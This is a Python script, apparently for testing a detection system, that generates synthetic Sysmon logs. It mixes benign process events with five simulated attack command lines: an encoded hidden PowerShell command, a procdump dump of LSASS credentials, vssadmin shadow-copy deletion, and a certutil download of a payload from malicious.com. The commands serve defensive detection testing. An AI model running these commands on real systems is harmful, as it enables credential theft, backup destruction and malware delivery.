import json
import os
import random
import string
from datetime import datetime, timedelta

def get_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_random_special(length):
    return ''.join(random.choices("!@#$%^&*()_+-=[]{}|;':,./<>?", k=length))

def generate_noise(num_events=800):
    """
    Generates benign baseline Sysmon event data.
    Increased to 800 to heavily weight common processes.
    """
    events = []
    base_time = datetime.now() - timedelta(days=1)
    
    benign_processes = [
        ("explorer.exe", "userinit.exe", ""),
        ("chrome.exe", "explorer.exe", "--type=renderer"),
        ("svchost.exe", "services.exe", "-k netsvcs"),
        ("conhost.exe", "cmd.exe", ""),
        ("notepad.exe", "explorer.exe", "C:\\Users\\user\\Desktop\\notes.txt"),
        ("taskmgr.exe", "explorer.exe", ""),
        ("msedge.exe", "explorer.exe", "--type=renderer"),
        ("excel.exe", "explorer.exe", "C:\\Users\\user\\Documents\\report.xlsx"),
        ("word.exe", "explorer.exe", "C:\\Users\\user\\Documents\\draft.docx")
    ]
    
    for _ in range(num_events):
        proc, parent, cmd = random.choice(benign_processes)
        time_offset = timedelta(minutes=random.randint(1, 1440))
        event_time = base_time + time_offset
        
        # Add slight variation to benign commands
        if "chrome.exe" in proc or "msedge.exe" in proc:
            cmd += f" --lang=en-US --variations-seed-version={random.randint(1000, 9999)}"
        elif "notepad.exe" in proc or "excel.exe" in proc or "word.exe" in proc:
            cmd = cmd.replace(".txt", f"_{get_random_string(4)}.txt")
            cmd = cmd.replace(".xlsx", f"_{get_random_string(4)}.xlsx")
            cmd = cmd.replace(".docx", f"_{get_random_string(4)}.docx")
        
        events.append({
            "EventID": 1,
            "Timestamp": event_time.isoformat(),
            "ProcessName": proc,
            "ParentProcessName": parent,
            "CommandLine": f"{proc} {cmd}".strip()
        })
        
    return events

def generate_attacks():
    """
    Generates simulated malicious Sysmon event data based on our rules and ML features.
    """
    base_time = datetime.now()
    
    # Randomize the payload to ensure variation and extreme length
    rand_str = get_random_string(100)
    rand_special = get_random_special(50)
    extreme_payload = f"unknown_dropper.exe {rand_special} {{malicious_payload_{rand_str}}} --silent --bypass --obfuscate {get_random_special(20)}"
    
    attacks = [
        # Rule 1: PowerShell Encoded Command
        {
            "EventID": 1,
            "Timestamp": (base_time - timedelta(minutes=120)).isoformat(),
            "ProcessName": "powershell.exe",
            "ParentProcessName": "cmd.exe",
            "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA..."
        },
        # Rule 2: LSASS Dump
        {
            "EventID": 1,
            "Timestamp": (base_time - timedelta(minutes=60)).isoformat(),
            "ProcessName": "procdump.exe",
            "ParentProcessName": "powershell.exe",
            "CommandLine": "procdump.exe -accepteula -ma lsass.exe lsass.dmp"
        },
        # Rule 3: VSSAdmin Delete Shadows
        {
            "EventID": 1,
            "Timestamp": (base_time - timedelta(minutes=30)).isoformat(),
            "ProcessName": "vssadmin.exe",
            "ParentProcessName": "cmd.exe",
            "CommandLine": "vssadmin.exe delete shadows /all /quiet"
        },
        # Rule 4: Certutil Download
        {
            "EventID": 1,
            "Timestamp": (base_time - timedelta(minutes=10)).isoformat(),
            "ProcessName": "certutil.exe",
            "ParentProcessName": "cmd.exe",
            "CommandLine": "certutil.exe -urlcache -split -f http://malicious.com/payload.exe payload.exe"
        },
        # ML Anomaly: Rare process with extreme weird command line
        {
            "EventID": 1,
            "Timestamp": base_time.isoformat(),
            "ProcessName": "unknown_dropper.exe",
            "ParentProcessName": "explorer.exe",
            "CommandLine": extreme_payload
        }
    ]
    
    return attacks

def main():
    print("[*] Generating simulated Sysmon data...")
    noise = generate_noise(800)
    attacks = generate_attacks()
    
    # Combine and sort by timestamp
    all_events = noise + attacks
    all_events.sort(key=lambda x: x['Timestamp'])
    
    import pandas as pd
    
    # Save to file
    output_dir = "data"
    os.makedirs(output_dir, exist_ok=True)
    output_path = os.path.join(output_dir, "sysmon_logs.csv")
    
    # Convert list of dicts to DataFrame and save as CSV
    df = pd.DataFrame(all_events)
    df.to_csv(output_path, index=False)
        
    print(f"[+] Successfully generated {len(all_events)} events (800 benign, {len(attacks)} attacks).")
    print(f"[+] Saved to {output_path}")

if __name__ == "__main__":
    main()
